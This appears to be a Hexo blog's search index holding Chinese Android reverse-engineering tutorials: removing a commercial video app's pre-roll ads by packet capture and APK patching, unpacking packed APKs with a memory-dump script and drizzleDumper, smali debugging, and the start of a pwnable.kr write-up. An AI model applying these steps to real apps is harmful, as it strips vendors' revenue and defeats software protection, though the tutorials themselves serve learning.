<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>APK抓包分析去除聚力视频HD的广告</title>
    <url>/2018/03/09/APK%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%8E%BB%E9%99%A4%E8%81%9A%E5%8A%9B%E8%A7%86%E9%A2%91HD%E7%9A%84%E5%B9%BF%E5%91%8A/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>目前视频播放类APK在播放前都会播放一段广告，短则几十秒，多则一分多钟。当然Vip会员就不会有广告播放，毕竟这也是人家重要的的收入来源。本文就用抓取流量包的方式获取到广告的url的地址，进而在播放视频时不会有广告的播放。实验所用的APK为“聚力视频HD”，这款应用没有做什么保护，分析操作起来较容易。</p>
<a id="more"></a>
<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><h3 id="Charles抓包环境配置"><a href="#Charles抓包环境配置" class="headerlink" title="Charles抓包环境配置"></a>Charles抓包环境配置</h3><p>抓包工具使用Charles,工具好像要收费，但网上也有破解版。使用该工具需要做一些配置。工具界面如下：<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t1.png" alt="Charles界面-1"></p>
<ol>
<li>首先要保证手机与电脑要在同一网段内.(这里使用的是夜神模拟器)</li>
<li>查看电脑的IP地址。打开cmd,输入ipconfig。这里本机地址是192.168.1.103<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t2.png" alt="本机IP-2"></li>
<li>设置模拟器IP及port。<br>找到模拟器的设置，点击无线WLAN<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t3.png" alt="模拟器无线界面-3"><br>长按WiredSSID，弹出修改网络提示框。修改网络。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t4.png" alt="修改网络-4"><br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t5.png" alt="修改地址及端口-5"> </li>
<li>打开电脑Charles会出现一个提示框，点击allow即可。这样就配置好了。<h3 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h3><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t6.png" alt="Charles抓包界面-6"><br>打开聚力视频，会发现Charles抓了很多包，但并没有用，因为还没有播放视频。点击类似扫把的按钮，将数据包清空。再随便找一个视频打开。抓了很多包后就暂时退出此应用，不然抓包还会更多。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t7.png" alt="流量抓包-7"><br>可以看到抓了很多流量包，这时就要留意这些链接了。重点关注带有ad的链接。观察返回的json。返回图片的可以忽略。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t8.png" alt="可疑地址-8"><br>这里先看第二个链接：<a href="http://ads.data.pplive.com" target="_blank" rel="noopener">http://ads.data.pplive.com</a>.<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t9.png" alt="可以链接2-9"><br>复制链接到浏览器中，看会返回什么信息。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t10.png" alt="浏览器返回-10"><br>只是在界面上显示了个ok，并没有什么信息。这个应该不是我们要找的广告链接。<br>这里再看第一个链接：<a href="http://de.as.pptv.com。同样的将url复制到浏览器中，看返回信息。" target="_blank" rel="noopener">http://de.as.pptv.com。同样的将url复制到浏览器中，看返回信息。</a><br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t11.png" alt="浏览器返回-11"><br>可以看到返回了一个xml文件，里面包含了很多信息。查看有没有MP4,flv结尾的链接。果不其然发现了一个后缀为MP4的链接。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t12.png" alt="广告视频地址-12"><br>将连接拷贝到浏览器中查看是否为刚才播放的广告。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t13.png" alt="广告界面-13"><br>这样就找到了广告链接。<h3 id="广告链接确认"><a href="#广告链接确认" class="headerlink" title="广告链接确认"></a>广告链接确认</h3>为了确认这个到底真的是不是广告链接。可以将这些域名重定向到另外一个不存在的服务地址，在链接上右键-<img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t14.png" alt="map remote-14"><br>修改域名后，点击播放手机视频，看看播放是否正常，还有没有广告播放。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t15.png" alt="广告播放-15"><br>可以看到广告已经不再播放了。可以确认这就是播放广告的链接。接下来就是源码修改了<h2 id="破解方案"><a href="#破解方案" class="headerlink" title="破解方案"></a>破解方案</h2><h3 id="签名校验检测"><a href="#签名校验检测" class="headerlink" title="签名校验检测"></a>签名校验检测</h3>签名校验，最简单的就是将apk包反编译后再回编译签名，安装。看程序能否正常运行（有广告，并没有破解）。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t16.png" alt="签名校验-16"><h3 id="破解apk"><a href="#破解apk" class="headerlink" title="破解apk"></a>破解apk</h3>使用Android killer反编译聚力视频，当然也可以使用其他的工具，个人爱好。反编译结束后，在搜索框输入链接字符串“<a href="http://de.as.pptv.com”" target="_blank" rel="noopener">http://de.as.pptv.com”</a><br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t17.png" alt="android killer-17"><br>可以发现有若干相似字符，但我们要注意到抓包的路径“<a href="http://de.as.pptv.com/lkandelivery/vast/3.0draft”。好像都和ad有关。直接将所有字符串替换为空。" target="_blank" rel="noopener">http://de.as.pptv.com/lkandelivery/vast/3.0draft”。好像都和ad有关。直接将所有字符串替换为空。</a><br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t18.png" alt="替换字符串-18"><br>然后保存，回编译，签名。安装。<br>看下播放视频还会不会有广告播放。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p3-180309/t19.png" alt="广告拦截-19"></li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>经过了抓包，分析后找到正确的链接。本文章主要是介绍抓包分析过程，所以对apk文件并没有很强的要求。爱奇艺对广告链接就封装的很好，抓包不会发现任何有关广告的链接。通过DDMS的输出才会发现广告链接，进而才会发现其广告是通过libcupid.so完成的。而且还有签名校验。搜狐视频的广告链接可以通过抓包获取到，但有签名校验的存在。因为本章节主要是介绍抓包分析，所以并不做过多介绍。</p>
]]></content>
      <categories>
        <category>逆向技术学习</category>
      </categories>
      <tags>
        <tag>APK去广告</tag>
      </tags>
  </entry>
  <entry>
    <title>APK脱壳简介</title>
    <url>/2018/04/15/Apk%E8%84%B1%E5%A3%B3%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>本来题目是要定为App加固与对抗，但这样内容量就很大，而且最近的学习脱壳内容也只是其中的一小部分，所以就简单对脱壳做一些介绍。</p>
</blockquote>
<a id="more"></a>
<h2 id="Apk加壳"><a href="#Apk加壳" class="headerlink" title="Apk加壳"></a>Apk加壳</h2><h3 id="什么是加壳"><a href="#什么是加壳" class="headerlink" title="什么是加壳"></a>什么是加壳</h3><blockquote>
<p>加壳就是在二进制的程序中植入一段代码，在运行过程中优先取得程序的控制权，做一些额外的工作，多数病毒就是基于此原理：</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180415/p1.png" alt=""></p>
<blockquote>
<p>所谓Apk加壳，就是给目标Apk加一层保护程序，把重要数据信息隐藏起来。加壳程序可以有效 阻止对程序的反编译和逆向分析。Apk壳本质的功能就是实现类加载器。系统先执行壳代码，然后将加了密的dex进行解密操作，再加载到系统内存中运行。</p>
</blockquote>
<h2 id="安卓dex-加壳原理"><a href="#安卓dex-加壳原理" class="headerlink" title="安卓dex 加壳原理"></a>安卓dex 加壳原理</h2><blockquote>
<p>加壳过程中主要有三个程序：</p>
</blockquote>
<ul>
<li>需要加壳的源Apk1(未加壳的原始应用)</li>
<li>壳程序APK2(用来解密并运行apk1程序)</li>
<li>加密工具(将源APK1进行加密，并和壳程序APK2的dex合并成新的dex)</li>
</ul>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180415/p2.png" alt=""></p>
<blockquote>
<p>加壳示例过程：待脱壳数据位于位于脱壳程序文件尾。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180415/p3.png" alt=""></p>
<p>加壳过程：</p>
<blockquote>
<ul>
<li>得到需要加密的apk和自己的脱壳程序apk1。</li>
<li>利用加壳工具对源apk进行加密。把加密后的apk数据写入脱壳程序的Dex末尾，并在文件尾部添加加密数据的大小；修改脱壳程序Dex头中的checksum.signature和file_size头信息；合并得到新的Dex1文件。</li>
<li>然后将新的Dex1文件替换原脱壳程序apk1中dex文件。生成新的apk，叫做脱壳程序apk。</li>
</ul>
</blockquote>
<p>脱壳过程：</p>
<blockquote>
<ul>
<li>读取Dex文件末尾数据获取待脱壳加密数据长度。</li>
<li>从Dex文件读取脱壳数据，解密加密数据。以文件形式保存解密的数据到*.apk文件.</li>
<li>通过DexClassLoader动态加载*.apk。</li>
</ul>
</blockquote>
<h3 id="壳史"><a href="#壳史" class="headerlink" title="壳史"></a>壳史</h3><p>第一代壳：DEX加密(混淆技术)</p>
<blockquote>
<ul>
<li>Dex字符串加密</li>
<li>资源加密</li>
<li>对抗反编译</li>
<li>反调试</li>
<li>自定义DexClassLoader</li>
</ul>
</blockquote>
<blockquote>
<p>对于一些字符串加密，资源混淆的实现，不得不提ProGuard。这是一个压缩，优化，和混淆java字节码文件的免费工具。它可以删除无用的类，字段，方法和属性。可以用简短无意义的名称来命名已存在的类，字段，方法等。android studio自带了这个功能。对于反调试就比较多了，例如ptrace自身进程，检查进程运行状态，检查调试器进程，完整性校验，断点检测等，后期会对反调试内容进行深入学习研究</p>
</blockquote>
<p>第二代壳：Dex抽取与So加固(加壳技术)</p>
<blockquote>
<ul>
<li>对抗第一代壳常见的脱壳法</li>
<li>Dex Method代码抽取到外部（通常企业版）</li>
<li>Dex动态加载</li>
<li>So加密</li>
</ul>
</blockquote>
<blockquote>
<p>类抽取常规的有隐藏dex文件和修改dex结构。隐藏dex文件是通过对目标dex文件进行整体加密或压缩方式把整个dex转换为另外一个文件存放在assert文件夹中或者其它地方，然后利用类加载器技术进行内存解密并加载运行。而修改dex结构则是抽取DexCode中的字节码指令后用零去填充，或者修改方法属性等操作，运行时在内存中做修正，修复等处理工作。</p>
</blockquote>
<blockquote>
<p>关于Dex动态加载，就要提到dalvik虚拟机了。它和java虚拟机一样，在运行程序时首先需要将对应的类加载到内存中。在标准虚拟机中，类加载可以从class文件中读取，也可以是其他二进制流，这样就可以在程序运行时手动加载class，从而达到代码动态执行的目的。常用的有两个类：DexClassLoader和PathClassLoader,PathClassLoader是安卓应用中的默认加载器。<br>区别：DexClassLoader可以加载任何路径的dex/dex/jar<br>PathClassLoader只能加载data/app中的apk,也就是已经安装到手机中的apk.这个也是PathClassLoader作为默认的类加载器的原因，因为一般程序都是安装了，再打开，这时PathClassLoader就去加载指定的apk.</p>
</blockquote>
<p>第三代壳：Dex动态解密与So混淆(指令抽离)</p>
<blockquote>
<ul>
<li>Dex Method代码动态解密</li>
<li>So代码膨胀混淆</li>
<li>对抗之前出现的所有脱壳法</li>
</ul>
</blockquote>
<p>第四代壳：arm vmp(指令转换)</p>
<blockquote>
<p>vmp:用vmp加固后的还原过程比较复杂和困难，需要用大量的时间作分析。</p>
</blockquote>
<h3 id="壳的识别"><a href="#壳的识别" class="headerlink" title="壳的识别"></a>壳的识别</h3><p>国内提供apk加固的第三方技术公司有：</p>
<blockquote>
<p>娜迦  爱加密 梆梆加固 360加固保  百度加固 腾讯加固 等。<br>通过查看资料发现大多数加密后都会生成相应的特征so文件。这样就可以根据so来查壳。</p>
</blockquote>
<table>
<thead>
<tr>
<th align="center">特征So文件</th>
<th align="center">所属加固公司</th>
</tr>
</thead>
<tbody><tr>
<td align="center">libchaosvmp.so</td>
<td align="center">娜迦</td>
</tr>
<tr>
<td align="center">libddog.so</td>
<td align="center">娜迦</td>
</tr>
<tr>
<td align="center">libfdog.so</td>
<td align="center">娜迦</td>
</tr>
<tr>
<td align="center">libedog.so</td>
<td align="center">娜迦企业版</td>
</tr>
<tr>
<td align="center">libexec.so</td>
<td align="center">爱加密</td>
</tr>
<tr>
<td align="center">libexecmain.so</td>
<td align="center">爱加密</td>
</tr>
<tr>
<td align="center">ijiami.dat</td>
<td align="center">爱加密</td>
</tr>
<tr>
<td align="center">ijiami.ajm</td>
<td align="center">爱加密企业版</td>
</tr>
<tr>
<td align="center">libsecexe.so</td>
<td align="center">梆梆免费版</td>
</tr>
<tr>
<td align="center">libsecmain.so</td>
<td align="center">梆梆免费版</td>
</tr>
<tr>
<td align="center">libSecShell.so</td>
<td align="center">梆梆免费版</td>
</tr>
<tr>
<td align="center">libDexHelper.so</td>
<td align="center">梆梆企业版</td>
</tr>
<tr>
<td align="center">libDexHelper-x86.so</td>
<td align="center">梆梆企业版</td>
</tr>
<tr>
<td align="center">libprotectClass.so</td>
<td align="center">360</td>
</tr>
<tr>
<td align="center">libjiagu.so</td>
<td align="center">360</td>
</tr>
<tr>
<td align="center">libjiagu_art.so</td>
<td align="center">360</td>
</tr>
<tr>
<td align="center">libjiagu_x86.so</td>
<td align="center">360</td>
</tr>
<tr>
<td align="center">libegis.so</td>
<td align="center">通付盾</td>
</tr>
<tr>
<td align="center">libNSaferOnly.so</td>
<td align="center">通付盾</td>
</tr>
<tr>
<td align="center">libnqshield.so</td>
<td align="center">网秦</td>
</tr>
<tr>
<td align="center">libbaiduprotect.so</td>
<td align="center">百度</td>
</tr>
<tr>
<td align="center">aliprotect.dat</td>
<td align="center">阿里聚安全</td>
</tr>
<tr>
<td align="center">libsgmain.so</td>
<td align="center">阿里聚安全</td>
</tr>
<tr>
<td align="center">libsgsecuritybody.so</td>
<td align="center">阿里聚安全</td>
</tr>
<tr>
<td align="center">libmobisec.so</td>
<td align="center">阿里聚安全</td>
</tr>
<tr>
<td align="center">libtup.so</td>
<td align="center">腾讯</td>
</tr>
<tr>
<td align="center">libexec.so</td>
<td align="center">腾讯</td>
</tr>
<tr>
<td align="center">libshell.so</td>
<td align="center">腾讯</td>
</tr>
<tr>
<td align="center">mix.dex</td>
<td align="center">腾讯</td>
</tr>
<tr>
<td align="center">lib/armeabi/mix.dex</td>
<td align="center">腾讯</td>
</tr>
<tr>
<td align="center">lib/armeabi/mixz.dex</td>
<td align="center">腾讯</td>
</tr>
<tr>
<td align="center">libtosprotection.armeabi.so</td>
<td align="center">腾讯御安全</td>
</tr>
<tr>
<td align="center">libtosprotection.armeabi-v7a.so</td>
<td align="center">腾讯御安全</td>
</tr>
<tr>
<td align="center">libtosprotection.x86.so</td>
<td align="center">腾讯御安全</td>
</tr>
<tr>
<td align="center">libnesec.so</td>
<td align="center">网易易盾</td>
</tr>
<tr>
<td align="center">libAPKProtect.so</td>
<td align="center">APKProtect</td>
</tr>
<tr>
<td align="center">libkwscmm.so</td>
<td align="center">几维安全</td>
</tr>
<tr>
<td align="center">libkwscr.so</td>
<td align="center">几维安全</td>
</tr>
<tr>
<td align="center">libkwslinker.so</td>
<td align="center">几维安全</td>
</tr>
<tr>
<td align="center">libx3g.so</td>
<td align="center">顶像科技</td>
</tr>
<tr>
<td align="center">libapssec.so</td>
<td align="center">盛大</td>
</tr>
<tr>
<td align="center">librsprotect.so</td>
<td align="center">瑞星</td>
</tr>
</tbody></table>
<blockquote>
<p>这个特点可以作为加壳厂商的特征。这样就可以得到厂商加壳的套路，脱壳也就有了破解之法。<br>这里提一下网上的一款apk查壳工具：ApkScan-PKID.其工作原理就是根据apk加壳后生成的特征文件来匹配加壳厂商的。这里给作者点个赞。</p>
</blockquote>
<h3 id="简单的几种脱壳方法"><a href="#简单的几种脱壳方法" class="headerlink" title="简单的几种脱壳方法"></a>简单的几种脱壳方法</h3><p><strong>内存dump法：</strong></p>
<blockquote>
<ul>
<li>在内存中寻找dex 035 或者dex 036</li>
<li>/proc/xxx/maps中查找后，手动dump<br>脚本：android-UNpacker   drizzleDumper  升级版的android-UNpacker dumpDex<br>IDA Pro+dumpDEX(脱壳代码如下)</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static main(void)&#123;</span><br><span class="line">auto fp,begin,end,dexbyte;</span><br><span class="line">fp&#x3D;fopen(&quot;E:\\dump.dex&quot;,&quot;wb&quot;)</span><br><span class="line">begin&#x3D;0x755A9000; &#x2F;&#x2F;起始地址</span><br><span class="line">end&#x3D;begin+dex文件大小;</span><br><span class="line">for(dexbyte&#x3D;begin;dexbyte&lt;end;dexbyte++)</span><br><span class="line">    fputc(Byte(dexbyte),fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>动态调试法</strong><br><strong>Hook方法:</strong>hook dvmDexfileOpenPratial(加载函数)<br><strong>定制系统:</strong>修改安卓源码并刷机</p>
<blockquote>
<p>以上是几种简单的脱壳法，具体其他的还没有研究。可参考<a href="http://www.mottoin.com/89035.html" target="_blank" rel="noopener">http://www.mottoin.com/89035.html</a></p>
</blockquote>
<h2 id="Apk脱壳简单示例-脚本"><a href="#Apk脱壳简单示例-脚本" class="headerlink" title="Apk脱壳简单示例(脚本)"></a>Apk脱壳简单示例(脚本)</h2><blockquote>
<p>下面我们使用DrizzleDump脚本对360加壳的一个apk做演示。<br>工具：已root手机一部，apk为i春秋。</p>
</blockquote>
<h3 id="反编译app"><a href="#反编译app" class="headerlink" title="反编译app"></a>反编译app</h3><p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180415/p4.png" alt=""></p>
<blockquote>
<p>可以看到方法都被改为jni方法了，多亏了那两个特征so文件。</p>
</blockquote>
<h3 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h3><p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180415/p5.png" alt=""></p>
<blockquote>
<p>将后缀改为zip解压，在assets目录下可以看到libjiagu.so特征库。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180415/p6.png" alt=""></p>
<h3 id="拷贝drizzledump"><a href="#拷贝drizzledump" class="headerlink" title="拷贝drizzledump"></a>拷贝drizzledump</h3><blockquote>
<p>将drizzledumper通过adb上传到/data/local/tmp目录</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180415/p7.png" alt=""></p>
<blockquote>
<p>可以看到脚本已经上传到相应目录下了。但还没有执行权限。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 777 drizzledumper</span><br></pre></td></tr></table></figure>
<blockquote>
<p>然后将i春秋app运行起来，这样内存中才会有有数据。然后执行drizzleDump。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180415/p8.png" alt=""></p>
<blockquote>
<p>但是没有什么效果，提示参数不够。应该加上包名，等待扫描的时间。这个扫描时间是因为多次扫描。</p>
</blockquote>
<h3 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h3><p>这次加上参数运行。</p>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180415/p9.png" alt=""></p>
<blockquote>
<p>可以看到dex文件已经被dump出来了。将dex文件下载到电脑上。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180415/p10.png" alt=""></p>
<blockquote>
<p>使用jdx直接反编译dex，可以看到已经有了原始g的java代码。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180415/p11.png" alt=""></p>
<blockquote>
<p>关于脚本drizzleDumper工作的原理是root环境下，通过ptrace附加需要脱壳的apk进程，然后在脱壳的apk进程的内存中进行dex文件的特征搜索，当搜索到dex文件时，进行dex文件的内存dump。</p>
</blockquote>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最近在网上看了很多资料，很多都是参考大佬们所写博客。加壳和脱壳还有很多东西要学。还有java的反射技术在加壳中的应用，脱壳的技术还有很多种，后续还会对相应的脱壳做总结。学无止境！</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://blog.csdn.net/jiazhijun/article/details/8678399" target="_blank" rel="noopener">http://blog.csdn.net/jiazhijun/article/details/8678399</a><br><a href="https://blog.csdn.net/jiangwei0910410003/article/details/48415225" target="_blank" rel="noopener">https://blog.csdn.net/jiangwei0910410003/article/details/48415225</a><br><a href="http://www.mottoin.com/89035.html" target="_blank" rel="noopener">http://www.mottoin.com/89035.html</a><br><a href="https://blog.csdn.net/qq1084283172/article/details/53561622" target="_blank" rel="noopener">https://blog.csdn.net/qq1084283172/article/details/53561622</a></p>
<p>个人拙见，错误之处请大佬指正，欢迎留言交流。</p>
]]></content>
      <categories>
        <category>理论学习</category>
      </categories>
      <tags>
        <tag>APK脱壳</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Studio+夜神模拟器 动态调试APK</title>
    <url>/2018/03/03/Android%20Studio+%E5%A4%9C%E7%A5%9E%E6%A8%A1%E6%8B%9F%E5%99%A8%20%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95APK/</url>
    <content><![CDATA[<h2 id="1-smali文件格式"><a href="#1-smali文件格式" class="headerlink" title="1 smali文件格式"></a>1 smali文件格式</h2><table>
<thead>
<tr>
<th align="left">头部定义</th>
<th align="center">域定义</th>
<th align="right">函数定义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">.class</td>
<td align="center">.field public</td>
<td align="right">.method</td>
</tr>
<tr>
<td align="left">.super</td>
<td align="center">.field static</td>
<td align="right">instruction</td>
</tr>
<tr>
<td align="left">.source</td>
<td align="center">.field private</td>
<td align="right">.endmethod</td>
</tr>
</tbody></table>
<a id="more"></a>

<h2 id="2-准备"><a href="#2-准备" class="headerlink" title="2 准备"></a>2 准备</h2><p>Android studio（简称AS）<br>smalidea-0.05.zip(插件)<br>android killer(修改smali文件)<br>夜神模拟器<br>实验程序 crakme02.apk</p>
<h3 id="2-1-修改AndroidManifest-xml"><a href="#2-1-修改AndroidManifest-xml" class="headerlink" title="2.1 修改AndroidManifest.xml"></a>2.1 修改AndroidManifest.xml</h3><p>使用apktool.jar反编译apk。命令：java -jar apktool.jar d -f xxx.apk<br>会生成xxx文件夹。动态调试需要在AndroidManifest.xml添加可调试属性android:debuggable=”true”<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p1.jpg" alt="xml表"><br>修改后同样使用apktool.jar进行回编译。命令：java -jar apktool.jar b -f xxx.apk（未签名）<br>打包后的apk并没有签名。可以使用jdk自带的keytool生成keystore,然后使用jarsigner进行签名。<br>以上过程可以使用一些工具来进行修改。反编译后的xxx文件夹是加载到android studio中的源代码。回编译的apk是安装在夜神模拟器中的。</p>
<h3 id="2-2-AS安装smalidea插件"><a href="#2-2-AS安装smalidea插件" class="headerlink" title="2.2 AS安装smalidea插件"></a>2.2 AS安装smalidea插件</h3><p>这里的smalidea-0.05.zip插件是下载好的。<br>依次点击File–&gt;setting–&gt;Plugins点击<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p2.jpg" alt="安装选取"><br>从磁盘安装后点击apply–&gt;ok–&gt;重启即可</p>
<h3 id="2-3-夜神模拟器连接DDMS"><a href="#2-3-夜神模拟器连接DDMS" class="headerlink" title="2.3 夜神模拟器连接DDMS"></a>2.3 夜神模拟器连接DDMS</h3><ol>
<li>启动模拟器</li>
<li>cd进入到夜神安装bin目录下，执行命令nox_adb.exe connect 127.0.0.1:62001</li>
<li>如果命令执行错误。可能是nox_adb.exe版本不对，下载相应版本的替换即可。<br>我这里是配合了环境变量，并将nox_adb.exe connect 127.0.0.1:62001命令做成一个bat。直接运行图方便。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p4.jpg" alt="启动模拟器"><br><strong>模拟器启动后安装回编译并签名的apk</strong><h2 id="3-调试"><a href="#3-调试" class="headerlink" title="3 调试"></a>3 调试</h2><h3 id="3-1-导入源码"><a href="#3-1-导入源码" class="headerlink" title="3.1 导入源码"></a>3.1 导入源码</h3>将反编译的xxx文件夹加载到AS，类似加载一个安卓工程（导入….）界面如下:<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p5.jpg" alt="源码导入"><h3 id="3-2-设置远程调试"><a href="#3-2-设置远程调试" class="headerlink" title="3.2 设置远程调试"></a>3.2 设置远程调试</h3>打开AS，依次点击Run–&gt;edit configurations如图示：<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p6.jpg" alt="配置远程调试"><br>点击+号，添加remote配置。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p7.jpg" alt="添加远程"><br>项目名字随便填，其余地方已用箭头标记<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p8.jpg" alt="配置端口"><h3 id="3-3-打开-Android-device-Monitor"><a href="#3-3-打开-Android-device-Monitor" class="headerlink" title="3.3 打开 Android device Monitor"></a>3.3 打开 Android device Monitor</h3><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p9.jpg" alt="打开ddms"><br>因为模拟器上没有运行什么应用，所以列表中并没有什么应用显示<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p10.jpg" alt="程序列表显示"><h3 id="3-4-下断点并开启调试"><a href="#3-4-下断点并开启调试" class="headerlink" title="3.4 下断点并开启调试"></a>3.4 下断点并开启调试</h3>这是一个检测输入是否正确的apk，所以断点就下到checkSN函数处，在代码最左边单击即可。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p11.jpg" alt="下调试断点"><br>打开cmd  输入 <code>adb shell am start -D -n com.droider.crackme0201/.MainActivity（包名/启动主activity）</code><br>然后模拟器会显示等待调试的弹出框<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p12.jpg" alt="启动调试"><br>接下来就是在AS中启动程序了Run—&gt;debug<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p13.jpg" alt="运行程序"><br>DDMS中也会显示调试程序包名<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p14.jpg" alt="ddms显示"><br>可以看到模拟器已经在程序中启动，而且ddms中红色的甲壳虫也变绿。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p15.png" alt="模拟器显示"><br>接下来我们随意输入，将程序停在所下断点处。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p16.png" alt="断点处"><br>可以看到断点已经停下。后续单步调试，查看变量等操作在这里就不介绍。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p17.png" alt="变量显示"><br>个人总结过程，仅供参考。</li>
</ol>
]]></content>
      <categories>
        <category>逆向技术学习</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>夜神模拟器</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwnable.kr题解之Fd</title>
    <url>/2018/03/26/Pwnable.kr%E9%A2%98%E8%A7%A3%E4%B9%8BFd/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>作为一名专业打酱油选手参加了强网杯，结果是相当失败。大部分题目都是Pwn题，有心无力，只叹自己学艺不精，所以准备好好学习Pwn。准备长期和<a href="http://www.pwnable.kr" target="_blank" rel="noopener">pwnable.kr</a>死磕。接下来正式开始个人的Pwn之旅。</p>
</blockquote>
<a id="more"></a>
<h2 id="题目介绍"><a href="#题目介绍" class="headerlink" title="题目介绍"></a>题目介绍</h2><blockquote>
<p>在Pwnable.kr网站注册登陆后，就可以做题了。这里是第一题Fd,显示如下：</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p1.png" alt=""></p>
<blockquote>
<p><a href="https://youtu.be/971eZhMHQQw" target="_blank" rel="noopener">https://youtu.be/971eZhMHQQw</a>是关于这道题的视频讲解，不过是在youtube上，翻墙了才能看，不过国内也有很多题解，足够了。<br>下面是ssh的链接地址。在linux系统中用这个就可以链接，密码是guest。链接效果如下：</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p2.png" alt=""></p>
<blockquote>
<p>不过我们想要下载源码怎么办呢？这里推荐一款连接工具：winscp,百度一下就可以下载。软件界面如下：</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p3.png" alt=""></p>
<blockquote>
<p>登录成功界面：</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p4.png" alt=""></p>
<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><blockquote>
<p>经过上面的过程我们可以获得elf文件和程序源码。但在比赛中，并不会提供程序源码，所以也不去看。先运行下程序，看看是怎么样的。将程序拷贝到linux中，先不使用ssh连接，时间久了会卡死。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p5.png" alt=""></p>
<blockquote>
